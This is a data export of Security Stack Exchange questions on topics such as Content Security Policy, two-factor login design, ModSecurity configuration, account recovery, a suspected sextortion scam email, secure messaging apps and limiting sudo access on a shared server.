  <p>This document defines a mechanism by which a web page can embed a nested browsing context if and only if it agrees to enforce a particular set of restrictions upon itself.
  <strong>Source</strong>: <a href=""https://www.w3.org/TR/csp-embedded-enforcement/"" rel=""nofollow noreferrer"">Content Security Policy: Embedded Enforcement</a></p>
</blockquote>

<p>Unless I understood it completely wrong, does this Embedding-CSP not ruin the fundamentals of CSP completely?</p>

<p><em>In a case wherin you can inject HTML (with an iframe) or JS (XSS) you'd be able to set such ""Embedded CSP"" attribute? That overwrites the CSP from the original HTTP response? That seems undesirable.</em> </p>
","72031","","72031","","2017-06-22 13:27:47","2017-06-22 18:44:28","Does an Embedded Content Security Policy (CSP) Enforcement ruin a ""regular"" CSP?","<web-browser><http><web><content-security-policy>","1","0","","","","CC BY-SA 3.0"
"162637","1","","","2017-06-23 22:02:09","","2","375","<p>Every website that I came across  that uses two-factor authentication asks the user for their password first. Then, after a correct password was entered, an SMS or an e-mail is sent that contains another code you have to enter in order to actually get logged in.</p>

<p>I wonder why that is the prevalent scheme, since I could come up with mechanisms that seem to be much secure to me:</p>

<ul>
<li>Asking for an external authentication first.

<ul>
<li>(Pro) The attacker cannot try different passwords first. This seems especially advantageous if the user reuses their passwords.</li>
<li>(Con) The user could be spammed this access codes.</li>
<li>The <em>con</em> could be easily fixed by using a cool down between requests.</li>
</ul></li>
<li>Only sending a code if the password was right, not telling if the password was right or not.

<ul>
<li>(Pro) The attacker cannot know if the entered password was right or wrong.</li>
<li>(Con) A user may be annoyed the they don't receive their code, since they don't see directly if the entered password was right.</li>
<li>That <em>con</em> could be fixed by sending the user a message that a wrong password was entered, or only truthfully telling the user/attacker 3 times if the entered password was wrong, and say it's right afterwards for any password.</li>
</ul></li>
</ul>
","13043","","","","","2017-06-23 22:48:21","Two factor authentication: Why ask for password first?","<multi-factor><account-security><ux>","1","0","","2017-06-25 18:44:04","","CC BY-SA 3.0"
"231656","1","","","2020-05-14 13:21:43","","0","79","<p>I'm developing a mobile app. I have a question, and here is the scenario.</p>

<p>If a person is logging into the App with google sign in API in a public network. The website will verify the user with his <code>Email ID</code> and if verified the website will in return returns the user details like his mobile number, address, and somethings. Meanwhile, from that Public network, a person has sniffed the <code>Email ID</code> of the user and that person uses that <code>Email ID</code> to retrieve the user details.</p>

<p>In this case, how can I verify the genuine user?</p>

<ul>
<li>Is there is some other technique to overcome this thing?</li>
<li>Should I use TLS to overcome this vulnerability?</li>
</ul>
","234552","","6253","","2020-05-14 13:46:41","2020-05-14 13:46:41","How to verify the genuine user identity using Google signin API?","<tls><authentication><account-security><sso>","0","2","","","","CC BY-SA 4.0"
"231869","1","","","2020-05-19 10:09:01","","1","410","<p>Using a web server with Nginx + ModSecurity + OWASP ModSecurity Core Rules... </p>

<p>On the OWASP config file <code>crs-setup.conf</code> is the order of the config section <code>SecAction</code> important or can i order them differently from the example config file? </p>

<p>Example: </p>

<pre><code>SecAction \
 ""id:900250,\
  phase:1,\
  nolog,\
  pass,\
  t:none,\
  setvar:'tx.restricted_headers=/proxy/ /lock-token/ /content-range/ /translate/ /if/'""

SecAction \
 ""id:900200,\
  phase:1,\
  nolog,\
  pass,\
  t:none,\
  setvar:'tx.allowed_methods=GET HEAD POST OPTIONS'""
</code></pre>

<p>By default <code>SecAction id:900200</code> is written before <code>SecAction id:900250</code>, is that order important?</p>
","79299","","79299","","2020-05-19 10:19:11","2023-07-01 02:07:31","Is `SecAction` order important for an OWASP ModSecurity config file?","<web-application><configuration><owasp><nginx><mod-security>","1","2","","","","CC BY-SA 4.0"
"231968","1","","","2020-05-20 22:12:59","","0","100","<h1>Preface</h1>

<p>We are currently creating a new system for our clients and are stuck on account recovery when a user loses access to everything.</p>

<p>The system is entirely controlled by our company in the following way:</p>

<ol>
<li>Our employee creates a client company profile (name*, other fields like logo, website are optional)</li>
<li>Our employee “invites“ the client’s administrator to the account by entering an email and/or a phone number (we send an email and/or text inviting the client to our system)</li>
<li>The client clicks on the generated URL and creates their access (adding any relevant info like their name, email/phone if it’s not already there or secondary emails/phone numbers, etc.)</li>
<li>The client can now invite further members to access their company’s information</li>
</ol>

<p>This works great and allows for account recovery assuming the user maintains access to their email or phone number.</p>

<h1>Issues</h1>

<p>The industry in which we work has a lot of movement and user emails and phone numbers change frequently. (Users are contractors).</p>

<p>Users may have access to multiple companies simultaneously. It’s not a 1:1 relationship, it’s an many:many relationship between company and user.</p>

<p>We foresee issues where a user is invited to join the system from company A (company A gives the contractor an internal email) then the user is added to a second company B (using the company A email). After the contract with company A is terminated, company A removes the user’s access (email, phone) and, because he’s human, the user forgets their password.</p>

<p>How does the user recover their account without having access to the account’s email or phone and how can we allow the user to securely change his account’s email or phone?</p>

<p>Yes, recovery questions are feasible, but I’ve never been a fan of this security method. People always forget what they put or they inadvertently make this information public on social media.</p>
","177044","","177044","","2020-05-20 22:18:58","2020-05-20 22:18:58","How to allow account recovery when a user loses everything?","<account-security><recovery>","0","3","","","","CC BY-SA 4.0"
"231970","1","","","2020-05-20 22:53:32","","0","154","<p>I received an email on the 14th saying that a hacker has access to my pc it says that at the time of hacking my account (myemail@gmail.com) had this password (it was a version of my password but not one that I’ve ever used for my gmail) and it claimed to have been watching me for months and that it had infected my pc through a adult website and had video of me when I was on the site doing you know what and that it would send it to my contacts and correspondence but I don’t have any contacts on my pc and also I use a different user and email when I do that, also why didn’t it send it to that email and not any of the other emails I have saved on my pc. Am I falling for a bullshit email or do I have something to worry about? Also it said I have 48 hours to pay them in bitcoins and that it would track when I opened it and start the countdown and I just opened it last night</p>
","235060","","","","","2020-05-20 23:03:42","Have I really been hacked or am I falling for a phishing scam","<account-security><phishing><data-leakage>","1","4","","2020-05-21 07:19:46","","CC BY-SA 4.0"
"231973","1","","","2020-05-20 23:46:39","","0","97","<p>Using Nginx, I hope to restrict the permissible hosts for cookies. My initial intention was to employ a Content Security Policy for this purpose, but I don't see an obvious way to do this via a CSP. Ideally I'd find something like</p>

<pre><code>Restrict-Cookies-Header: hostname1.tld hostname2.tld2
</code></pre>

<p>Can something like this be accomplished with HTTP headers? Thanks!</p>
","224548","","","","","2020-05-20 23:46:39","Is there a way to limit cookies to certain hosts in HTTP?","<web-application><http><cookies><nginx><content-security-policy>","0","4","","","","CC BY-SA 4.0"
"23178","1","","","2012-10-25 18:52:47","","3","139","<p>Is there a audit system that can help me try my strings? Such as user agents, post/get data, a simple way to test general sql injections to see how my rule sets hold?</p>

<p>I know with fire fox I can change my user agent but what about trying post and get type attacks?</p>
","","Thompson Smith","","","","2012-10-25 21:20:26","auditing mod security rule sets","<linux><windows><mod-security>","1","0","","","","CC BY-SA 3.0"
"232299","1","232304","","2020-05-27 21:43:33","","1","1792","<p>I read that uuid does not bring any security advantages</p>

<p><strong>But I can't find why It doesn't bring a little bit of extra security in the scenario below ?:</strong></p>

<p>Consider that right now the session id is encrypting the auto-increment id (no uuid is used). If someone manages to know how the session is encrypted, then he can impersonate all the users: encrypt ""1"" and set the value as sessionID, encrypts ""2"" and set the value as sessionID, etc.</p>

<p>Also consider that ids are not exposed.</p>

<p>Now if we were using uuid in place of auto-increment id, it is harder for the attacker to attack all the users as he can hardly guess the IDs present in the table, unlike with auto-increment id where he knows that ids are sequential. So It would prevent enumeration attacks.</p>
","235485","","","","","2020-05-27 23:13:54","using Uuid for security","<attacks><webserver><account-security><enumeration><uuid>","1","14","","","","CC BY-SA 4.0"
"232324","1","","","2020-05-28 08:35:11","","3","4424","<p>I have a website developed using VueJS (i.e. its a single page application). I've been looking at implementing Content Security Policy headers. As I tested out the header values I would need, I realised I would have to allow 'unsafe-inline' scripts, as this is fundamentally what my website is. </p>

<p>I've read around this a fair bit and found plenty of comments indicating that if I need to apply 'unsafe-inline', the CSP header really isn't going to do much for me.</p>

<p>So my question is; does applying 'unsafe-inline' render CSP more or less pointless? Does anyone have any good ideas of how to handle CSP on an SPA?</p>
","235506","","98538","","2020-05-28 09:47:08","2020-08-24 06:52:21","Content Security Policy applied to Single Page Applications: Is it worth it with unsafe-inline?","<web-application><content-security-policy><single-page-app>","4","4","","","","CC BY-SA 4.0"
"232343","1","232349","","2020-05-28 15:01:51","","0","234","<p>I implemented a 2FA authentication for a web app with PHP and Google Authenticator. In order to login to my system there are a few steps:</p>

<ol>
<li><p>User types in a complex master password in order to access the login page. The request is throttled for only 1 request every hour and includes a CAPTCHA.</p></li>
<li><p>User types in username and password in a web application on their computer. Forms contain CSRF token.</p></li>
<li><p>There is a Google Recaptcha V3 to ensure the request comes from a human. This check is done in the front and backend.</p></li>
<li><p>When the username and password matches, the server gets the secret key from the user database table and generates a QR code which is injected as a data URI src inside an HTML image tag. The user scans the bar code with google authenticator, which in turn generates a code which the user can use to login to the system.</p></li>
</ol>

<p><strong>What I don't understand:</strong>
Can't anyone scan the QR-Code if they cracked the username and password?
I have the feeling I'm doing something wrong in step 4.</p>

<p>Anyone could download the authenticator so I'm not entirely sure if its secure or is storing the secret inside my database a bad idea? Should users type in their secret to generate the QR code manually? Also, I'm thinking, shouldn't the secret change every once a while?</p>
","183160","","6253","","2020-05-28 15:07:03","2020-05-28 17:15:10","How safe is my login system (conceptually)?","<authentication><web-application><account-security><authenticator><web-authentication>","1","8","","","","CC BY-SA 4.0"
"232508","1","","","2020-06-01 07:52:24","","0","10464","<p>I was on Discord, and someone sent me an invite to a server called ""Operation: Pridefall"".</p>

<p>I didn't know what it was, the link is <code>http://discord.gg/xxxxxxxxx</code> - and the invite was legit.</p>

<p>I thought it was just a regular chat. I looked, and there was some IP addresses being leaked. </p>

<p>I asked the person who invited me, ""What is this?"". They said ""Look it up, it's exposing LGBT people""... I do not hate gays at all, and so they might dox me.</p>

<p>I have changed my discord password. But I don't know what else to do, and if this is legitimate. I do not know if it's possible to hack someone through a Discord 
invite. </p>

<p>Please let me know what to do.</p>
","235734","","485","","2020-06-02 16:38:24","2023-05-20 14:43:14","Discord server leaking IP addresses","<account-security>","2","19","","","","CC BY-SA 4.0"
"232593","1","232604","","2020-06-02 17:23:30","","1","108","<p>Apart from all the other security and design flaws of Wordpress, there is 1 point that particularly got my attention: ""Automatic Backups"".</p>

<p>These are saved inside the Wordpress directory. If you ask me, this seems wrong. Cant a hacker download these files or deploy a tool such as HTTrack? Then they would have enough time to get their hands on sensitive information.</p>

<p>As far as im aware, Wordpress doesnt store Database Backups as statements inside PHP files but .SQL, .Zip or some other format.</p>

<p>So my question: arent wordpress automatic backups easy targets for hackers? </p>
","183160","","","","","2020-06-18 03:51:11","Wordpress Backups and Security","<databases><account-security><wordpress><backup>","2","1","","","","CC BY-SA 4.0"
"232594","1","232603","","2020-06-02 17:32:14","","3","344","<p>Few months ago, my bank forced me to change my password. It was a random 32 characters long password, stored in a well-known password manager.</p>

<p>The new password had to be <em>exactly 8 digits</em>, to be entered manually by clicking on a randomly organized virtual keyboard (of 10 buttons, from 0 to 9), with some JS code preventing any copy-paste or the use of my password manager.</p>

<p>My questions:</p>

<ul>
<li>How does that new password policy changes the overall security of my bank account ?</li>
<li>Should I be worried that now my bank account is only protected by an 8-digit password, whereas standard security rules I know for years do advice for using a wide range of characters, and (way) more of them (typically, 12 characters mixing digits, lower, upper case and special characters) ?</li>
<li>Since my bank is not the only one to switch to that security policy (I know at least 2 other banks doing so, one being out of my country), I start to think a security group listened by banks is the origin of that policy change. Where do I start to look to learn more about this sudden and seemingly global change of policy ?</li>
</ul>
","235840","","206408","","2020-06-02 20:13:22","2020-06-02 20:30:41","Security of bank account using a 8 digit password","<passwords><account-security><password-policy><banks>","1","2","","","","CC BY-SA 4.0"
"23454","1","23466","","2012-11-01 07:11:39","","1","2029","<p>What is the best way of testing my Firewall configuration as i have deployed the Core Rule set provided by the OWASP. But my rule configuration was giving me too many false positives which i  resolved by deleting many of the rules from the core ruleset. <em>Now that i have deleted some problematic rules how can i now make sure that my configuration is still secure</em>.   </p>
","11801","","11801","","2013-01-14 15:30:49","2013-01-14 15:30:49","Testing Web Application Firewall Configuration (ModSecurity)","<web-application><firewalls><owasp><mod-security><waf>","3","0","","","","CC BY-SA 3.0"
"232626","1","","","2020-06-03 09:06:24","","2","150","<p>This is a question born more from the user perspective but I'm wondering how it fits into a proper user creation and management policy. As a consultant I tend to work with various different clients and one issue that keeps coming up concerns getting access to their systems. While each client has its own procedures and some move faster than others, one issue that keeps coming up concerns the initial account creation and VPN access <strong>requiring me to physically go on site</strong>. In order to properly create my account and/or (re)set the initial password <strong>my device has to be within a corporate network.</strong></p>

<p>My understanding of this so far is that VPN access won't be an option until after a first login and that IT is not able or more likely allowed to do this initial login for me. Some IT teams will do this anyway but I suspect it's probably not ISO 27001 compliant.</p>

<p>My questions on this are essentially:</p>

<ul>
<li>What are the reasons a user would have to be inside a corporate network before being able to access it remotely?</li>
<li>Is this an inherent limitation/feature of Active Directory or would this be tied to the type of VPN solution a company runs?</li>
<li>Does this offer any benefits from a security perspective?</li>
<li>Is there some sort of legal or security certification requirement that governs this?</li>
<li>Are there viable/secure workarounds?</li>
</ul>
","58810","","58810","","2020-06-03 13:09:32","2022-02-23 22:02:10","Requiring an on-site visit to reset a password or get VPN access","<account-security><corporate-policy><active-directory>","1","7","","","","CC BY-SA 4.0"
"164717","1","","","2017-07-09 05:48:19","","0","2189","<p>can someone watch my facebook video chats from a computer im still logged in on?
Say i video chat with someone and my facebook is open on a third device, can that third device watch the video im receiving?</p>
","152901","","","","","2017-09-07 07:07:59","can someone watch my facebook video chats from a computer im still logged in on?","<facebook><account-security>","1","2","0","","","CC BY-SA 3.0"
"232712","1","","","2020-06-04 12:54:42","","0","372","<p>Within the scope of a project for my client, I test the existing site and the project for security vulnerabilities using OWASP ZAP. The client uses invitations with QR Codes and QR Codes to login to his project.</p>

<p>How can I test QR Codes on security issues?</p>

<p>Can I also automate this process in the CI area?</p>

<p>Details to the QR Code:</p>

<ul>
<li>The QR Code of the customer contains a login number.</li>
<li>The QR Code is currently only sent by mail. </li>
</ul>

<p><a href=""https://resources.infosecinstitute.com/security-attacks-via-malicious-qr-codes/"" rel=""nofollow noreferrer"">https://resources.infosecinstitute.com/security-attacks-via-malicious-qr-codes/</a></p>
","204338","","204338","","2020-06-05 07:13:47","2020-06-05 07:13:47","QR Code Security Testing","<account-security><automated-testing><qr-code>","1","6","","2020-06-06 07:23:43","","CC BY-SA 4.0"
"164801","1","164802","","2017-07-10 12:58:10","","19","1824","<p>Something that's concerned me recently is ""doxing"" or the searching for and posting of personal information. Recently I carried out essentially an audit of my personal security online and discovered a search engine that is for exactly this purpose.</p>

<p>Curious, I put in my phone number and was shocked to find that this returned my Facebook profile.</p>

<p>I have never added my phone number to my Facebook profile, but I did have the Facebook app installed on my device previously.</p>

<p>How can I remove such details from my profile or at least ensure that this information is hidden better?</p>
","153004","","47692","","2017-07-10 20:05:42","2017-07-10 20:05:42","Privacy data concern: Facebook account appearing with a search for phone number, despite it never being added - what should I do?","<privacy><facebook><account-security><deletion>","1","8","","2017-07-10 17:35:36","","CC BY-SA 3.0"
"232849","1","","","2020-06-06 19:25:58","","1","186","<p>I'm working with a nonprofit that wants to use CiviCRM to process its donor, member, and patron personal information. Civi is CMS-based, and will only run via WordPress, Drupal, Joomla, etc. </p>

<p>Newb question: If I set up WordPress on localhost (on a single machine sharing wifi with other devices, but not sharing files), is that information just as secure as any other file on the computer (which is to say still vulnerable to malware and such, but generally safe from the network)? </p>

<p>I only have experience with WampServer, are there other, more secure options, or settings I should be aware of? Other than limiting computer access to certain users who exercise caution (vetting downloads, no personal email, strong password enforcment/2FA, etc.), is there anything else I can do to ensure the security of our sensitive information?</p>
","236109","","","","","2020-06-06 19:25:58","Is using localhost for sensitive data secure?","<network><account-security><wordpress><intranet>","0","3","","","","CC BY-SA 4.0"
"23739","1","23740","","2012-11-07 19:06:10","","2","341","<p>Up until recently I was under the impression that the social security number was insufficient information to perform identity theft, and that in practice you will at least need the victim's SSN <em>and</em> name.</p>

<p>However, recent events and stories have made me start questioning this assumption. Is knowing only the social security number sufficient enough for someone to steal an identity? Would it be possible (or realistic) if you also took into account potential social engineering attacks, presumably against state agencies, which could reveal additional private information through leveraging the known SSN?</p>
","3676","","98538","","2018-12-14 09:13:35","2018-12-14 09:13:35","Exposure risk of knowing only social security number?","<social-engineering><social-security-number>","1","0","","","","CC BY-SA 3.0"
"232961","1","232964","","2020-06-08 17:57:00","","5","406","<p>Let's say we have</p>

<ul>
<li><p>one db server.</p></li>
<li><p>three app servers with full database access.</p></li>
</ul>

<p>Which scenario is the best?</p>

<ol>
<li>Each app server connects to that one database with different passwords.</li>
</ol>

<p>Example: app srv 1 uses : ""$PSD$Passwrod3"" and app srv 2 uses ""sometH$ing else13pass"" and so on.</p>

<ol start=""2"">
<li>Every app server connects to that one database server with the same db password.</li>
</ol>

<p>Technically, even if the servers have three different passwords, if one is hacked, the hacker will have full access to the database. So, we can use one password to make things easy for developers.</p>

<p>Is there any counter explanation that would justify using three different db passwords to ""increase security""?</p>

<p>EDIT: app servers hold the same app</p>
","236222","","236222","","2020-06-08 19:10:32","2020-06-08 20:39:08","Giving different passwords to the app servers to access the same database. Pros and Cons?","<web-application><databases><account-security><data-leakage><sql-server>","1","0","","","","CC BY-SA 4.0"
"233043","1","","","2020-06-09 22:29:15","","1","219","<p>I just wanted to ask because I am in a situation now, where I have been locked out of my Instagram due to my mobile phone provider deactivating my Simcard. I have contacted Instagram support sending the images of my face to match my account but they have not replied after 2 weeks.</p>

<p>I was hoping that after my phone number is recycled I could contact the new owner and get them to help me. But from what you guys are discussing it seems people would stereotype me as a hacker. What next steps could I take to declare that I am a normal person or still get access to my inactive sim SMS whilst it is in the recycled mobile phone number pool?</p>

<p>Is there a way to buy back the phone number before it gets allocated to someone else?</p>

<p>Thanks</p>
","236332","","","","","2020-06-10 03:49:24","Recycled phone numbers","<account-security><phone><sms><instagram>","1","1","","2020-06-11 09:50:18","","CC BY-SA 4.0"
"165030","1","165045","","2017-07-12 16:19:30","","0","103","<p>Today I tried site:mysite.com at google and noticed that I have pages indexed with urls that shouldn't be there for example <strong>instead of</strong></p>

<pre><code>mysite.com/item/123/apple_wifi_review
</code></pre>

<p>I have:</p>

<pre><code>mysite.com/item/123/children.Also
</code></pre>

<p>This page goes to the item number 123 on my site anyway but I wonder where has google got this url.</p>

<p>To make it worse I can see this url on google:</p>

<pre><code>mysite.com/redirectUrl.php?elementId=494
</code></pre>

<p>Which if I click goes to ""not found page"" on my site but google <strong>cache</strong> show a page belonging to another site.</p>
","151639","","","","","2017-07-12 18:54:52","Google shows indexes of non-existing hacked-like URLs of my site and cached to other pages","<account-security>","1","2","","2017-07-13 05:19:04","","CC BY-SA 3.0"
"165129","1","","","2017-07-13 23:51:19","","10","1024","<p>More specifically and also generally than this <a href=""https://security.stackexchange.com/questions/136173/why-does-whatsapp-use-phone-number-instead-of-username-for-identification"">related question</a>, I'm curious about the privacy implications of <em>prominent</em> <strong>secure</strong> messaging apps (marketing themselves as protecting users' privacy) requiring identification via a phone number.</p>

<p>Signal, Telegram and TextSecure are the top-rated <a href=""https://www.eff.org/node/82654"" rel=""nofollow noreferrer"">EFF secure messaging apps</a>, earning green checkmarks in all categories. Yet all three require you to sign up with a phone number. The are two common reasons given for this:</p>

<ol>
<li><p><strong>Ease of use</strong> - I understand a <a href=""https://security.stackexchange.com/a/165127/10820"">phone is the easiest physical second factor to obtain</a>, and there's certain value in making privacy and security available to the less computer-savvy, but it's not like usernames are ""complicated"" - we've had more than a decade of username-based messaging apps like AIM, Yahoo! Messanger, and even the current Google Hangouts.</p></li>
<li><p><strong><a href=""https://security.stackexchange.com/questions/151125/why-does-google-require-a-phone-number-for-using-their-2fa-service/151131#151131"">Preventing abuse and spam</a></strong> - again not really an issue. To prevent abuse, the messaging services could use strong CAPTCHAs. SIM cards are <a href=""http://www.ebay.com/itm/100-COUNT-LOT-of-Sprint-NEXTEL-32k-SIM-Cards-/141695566498"" rel=""nofollow noreferrer"">50 cents a piece</a>, and that's after about a minute of searching on the US eBay. They're probably far cheaper in Asia or on the darkweb, and are routinely used to attempt to defraud various services that offer promos (e.g. free ride/delivery) to first-time users. However, messaging apps don't really offer high-value services. Also, it's easier to mass-IM all phone numbers in a range, offering geographic targeting even (by phone area code) than randomly generate user IDs (albeit I'd feel sorry for early adopters like <code>joe</code> and <code>sam</code>).</p></li>
</ol>

<p>I still don't understand why all these apps don't offer an option to just create a username, without ties to a tracking device the user carries in their pocket. (Note that many services specifically prohibit signing up with VoIP numbers like Google Voice, and ban free SMS verification services.)</p>

<p>Anyway, given that it seems we're stuck with secure messaging apps using the user's phone number as the identifier, what are the security and privacy implications of this? I see,</p>

<ol>
<li>Oppressive regimes can block services that rely on registration connected to the telecom infrastructure of a country. <a href=""https://twitter.com/maasalan/status/948192913657335809"" rel=""nofollow noreferrer"">Iran apparently has just done this to Telegram</a>.</li>
<li>A highly increased risk of <a href=""https://security.stackexchange.com/a/165127/10820"">phone account hijacking</a>, and hence complete account takeover and impersonation (which can be trivially used for example to lure a whistleblower into the hands of violent regimes)</li>
<li>Since <a href=""https://yro.slashdot.org/story/14/01/16/1944218/nsa-collects-200-million-text-messages-per-day"" rel=""nofollow noreferrer"">SMS traffic is collected by the NSA to the tune of 200M texts a day</a> (in 2014), any user receiving an authentication code via SMS from these ""secure"" messaging systems will <a href=""http://www.makeuseof.com/tag/interest-privacy-will-ensure-youre-targeted-nsa/"" rel=""nofollow noreferrer"">very likely</a> be flagged. Signal confirmed that it's possible to determine an SMS user is a Signal user, <a href=""https://github.com/WhisperSystems/Signal-Android/issues/6566#issuecomment-296499919"" rel=""nofollow noreferrer"">by design</a>.</li>
<li>Blatant exposure of relationships between users via metadata.  Prof. Kieran Healy wrote an excellent story showing how metadata (here, belonging to a group <em>that meets</em>, vs. the content of the meeting) can be used to identify key individuals - <a href=""https://kieranhealy.org/blog/archives/2013/06/09/using-metadata-to-find-paul-revere/"" rel=""nofollow noreferrer"">Using metadata to find Paul Revere</a>. This means that if I Signal about something completely innocuous with an individual I had no idea was on a watchlist, I could very well be associated with them as a suspect. In that case, I'd prefer my communication were <em>not</em> encrypted, so it would be visible that I'm not talking to the suspicious identity of the individual. Yet phone-number based secure messaging apps will do just that - associate my <em>identity</em> with that the of the suspect.</li>
<li>Your phone number inevitably is leaked to the other party. You don't generally want that when posting a classified or dating ad - which is why the popular messaging platform in these sensitive situations is not a secure messaging app, but Kik, which lets you create a username.</li>
</ol>

<p>As an innocent individual, it seems phone number-based secure messaging apps might bring more concern than security, due for example to the very real possibility of <a href=""https://www.wired.com/2007/05/ps-transparency/"" rel=""nofollow noreferrer"">mistakenly ending up on a terrorist watchlist</a>, or being flagged for the sole reason that you're using technology that was <a href=""http://www.makeuseof.com/tag/interest-privacy-will-ensure-youre-targeted-nsa/"" rel=""nofollow noreferrer"">advocated in extremist forums</a>.</p>

<p>Where am I wrong? What have I missed?</p>
","10820","","10820","","2018-05-17 12:55:39","2018-05-17 12:55:39","Implications of prominent *secure messaging apps* requiring phone number identifiers","<phone><account-security><instant-messaging><security-theater><identity-theft>","1","2","","","","CC BY-SA 4.0"
"233086","1","","","2020-06-10 21:49:40","","0","112","<p>I like to invest money online. I invest in both cryptocurrencies as well as regular stocks. As my bankroll grows (let's say 20k+ in the near future), I feel like I need to start taking more serious security measures. </p>

<p>My idea is to buy a cheap smartphone (~100$), and use this as a dedicated device. I either directly go to the website of whatever online broker I use. Or I download their app. I create a dedicated gmail address for these accounts, and I only access this gmail account on the dedicated phone. And I set up 2FA, which again, is located on the device. I do not use this device for anything else: no browsing, downloading, etc.</p>

<p>I do not take this phone outside of my house. And I do not connect with it to a Wi-Fi connection which is not under my control. I generally keep the device in airplane mode. And I never use Bluetooth.</p>

<p>For convenience I consider using a popular password manager. </p>

<p>Finally, I split up my bankroll over several online brokers. And I use different (difficult to brute force) passwords, for each account.</p>

<p>Is this safe? Am I overseeing something obvious? What are potential weaknesses/improvements?</p>

<p>Thanks.</p>
","236419","","236419","","2020-06-10 22:01:09","2020-06-10 22:01:09","Dedicated device for online investing and other security measures","<password-management><mobile><multi-factor><account-security><banks>","0","3","","","","CC BY-SA 4.0"
"233088","1","233089","","2020-06-11 04:21:18","","0","132","<p>A bank where I have an auto loan has a credit reporting feature. The feature shows that I have several ""Dark Web Alerts"" for ""Compromised Email Address"". The alerts list the breached sites, for example schmevite.com and schmafepress.com (and others). This doesn't make sense. How was my <em>email address</em> breached at a website for party invitations and blogging?</p>

<p>I haven't used either of those site in a long time. I assume my username is my email address. However, my email account not been breached (right?). The recommended action is to change my email password, but my email has not been breached, so why would I do that? Am I expected to change my email password every time some remote site that I've barely used is breached? Shouldn't it be telling me to change my schmevite and schmafepress passwords?</p>

<p>NOTE: I have a different, and reasonably complex password for each site. The point being if someone has breached my scmevite or schmafepress password, which uses my email as the <em>userid</em>, why do I need to change my email password? </p>

<p>But then I have another of the Dark Web Alerts which says ""Compromised Email Address"", but does not list a compromised website. Instead it says ""Password: Exposed"". Now I'm really concerned. If someone gets into my email account, they can find all of my other passwords (including to financial sites) by requesting password changes.</p>

<p>But that alert was exposed on 4/18/20 and I haven't lost my money yet. Should I be concerned about this? What do I do? (P.S. ""Should I be concerned about this"" is rhetorical -- I am!).</p>

<p>Thanks for helping me understand.</p>
","236215","","","","","2020-06-11 16:45:39","What do these credit security alerts mean?","<account-security>","1","2","","","","CC BY-SA 4.0"
"233092","1","","","2020-06-11 07:07:48","","2","82","<p>I had forgotten to log out of my personal T-Mobile web account on my computer at work today. When I came home, I remembered, so I logged on to my account at home (different computer, different network, of course, from work), and changed my passwords, pin-codes, as well as security questions. In addition, I have 2FA on.</p>

<p>Is this sufficient? I want to make sure I am logged out of the work location before I go in tomorrow. I want to make sure no one else can make any changes to my online account.</p>
","236243","","6253","","2020-06-11 07:20:53","2020-06-11 07:28:54","Protecting an account after staying logged in in a public place","<account-security>","1","0","","","","CC BY-SA 4.0"
"233094","1","","","2020-06-11 07:34:12","","0","278","<p>Why do most websites use the pair of username and password as we can just use a long password like a token to identify a user?</p>

<p>A simple example: On the server, we create a JSON file with user data inside of it (email, role etc.) and give it a random 32-characters name. Then if a user wants to log in, he just copy/paste his long password into one form input and submits the form. If submitted password matches with the name of JSON file on the server, the authorization is successful and the server identifies the user.</p>

<p>So why not and why username and password?</p>
","236437","","236437","","2020-06-12 08:00:07","2020-06-12 08:00:07","Why to use username and password instead of just a long password?","<authentication><passwords><account-security><authorization><identity>","1","1","","2020-06-11 07:41:29","","CC BY-SA 4.0"
"233109","1","","","2020-06-11 12:12:02","","0","216","<p>Is there any reason to show a Content-Security-Policy (CSP) HTTP Header for direct links to images such as <code>https://invalid.tld/direct-link-to-image.jpeg</code>?</p>
","54240","","","","","2020-06-11 13:35:29","Content-Security-Policy (CSP) HTTP Header useful for direct link to image?","<content-security-policy>","1","1","","","","CC BY-SA 4.0"
"233152","1","","","2020-06-12 13:38:08","","1","339","<p>I am a business owner with a strong technical background, say a programmer, though not an advanced system administrator. I've bought a VPS server where I want to host several applications and webpages. One of the apps consists of a back end, admin front end, and user front end. Another one is just back end and front end. So 5 different programmers develop those apps. From time to time, as the development takes place, those programmers need to install and upgrade some packages, modify system configs and so on, i.e. they need ssh access and some root privileges.</p>

<p>And here is the tricky part. It is obvious that I don't want them to see and gain access to the folders they are not supposed to see, i.e. the devs of the first app shouldn't have access to the folders of the second app and vice versa. Moreover, the backend dev of the first app shouldn't have access to the frontend folders of the same app and the same goes for the second app. Also, I would like to restrict access for them to certain commands like <code>visudo</code> or <code>reboot</code>, so they wouldn't be able to lock me out of my own server or reboot it without my consent.</p>

<p>Now, if I give them sudo privileges for them to be able to run administrative tasks needed for their development, then they have access to everything and it becomes practically impossible to restrict access for them to certain folders and commands. On the other hand, if I 8don't8 give them sudo privileges, then it becomes a huge pain for me to every time to install packages and give them access to certain files and commands they need to continue development. There are over 1500 commands and the corresponding number of system files in Linux they could potentially need access to, so it's very <em>very</em> inconvenient for me to spend so much time to administer the VPS, especially since I'm not a very advanced system administrator and I don't have much time because I need to run my business.</p>

<p>There are already numerous posts and threads on the Internet where people try to find solutions to somewhat related problems, like these:
<a href=""https://superuser.com/questions/149404/create-an-ssh-user-who-only-has-permission-to-access-specific-folders"">One</a>, <a href=""https://superuser.com/questions/299036/can-i-create-an-ssh-user-which-can-access-only-certain-directory?rq=1"">Two</a>, <a href=""https://superuser.com/questions/969292/restrict-access-to-directory-with-sudo"">Three</a>, <a href=""https://superuser.com/questions/893632/deny-access-to-a-specific-folder-for-a-sudo-user"">Four</a>, <a href=""https://serverfault.com/questions/36759/editing-sudoers-file-to-restrict-a-users-commands"">Five</a>, <a href=""https://serverfault.com/questions/308198/how-to-disable-sudoer-from-editing-etc-sudoers-file"">Six</a>, <a href=""https://unix.stackexchange.com/questions/419330/can-i-restrict-a-user-with-root-privilegeswith-sudo-from-accessing-deleting-a"">Seven</a>, <a href=""https://unix.stackexchange.com/questions/79147/protect-folder-from-sudoers"">Eight</a>, <a href=""https://unix.stackexchange.com/questions/282459/prevent-sudo-user-access-to-specific-folder-and-files"">Nine</a>,
and they still have no reasonable solutions to them, only those that involve some super-complex activities and not giving the desired result.</p>

<p>So from my point of view as a business owner, it should be something like this: there is a root user who can do everything. Root can create admins and define access rights for them, for example in that very sudoers file. Then it's root's decision whether to give access to an admin to the sudoers file itself and any of the folders and commands of root's choice. For example, an admin could be able to run any command in the system except <code>reboot</code> and <code>visudo</code> and the admin can access all files and folders except <code>/etc/sudoers</code> and say <code>/var/www/private_folder</code> even <em>with</em> sudo privileges invoked (meaning the admin can't even copy those files, overwrite them, <code>chmod</code> and <code>chown</code> them and so on, i.e. access them with any command).</p>

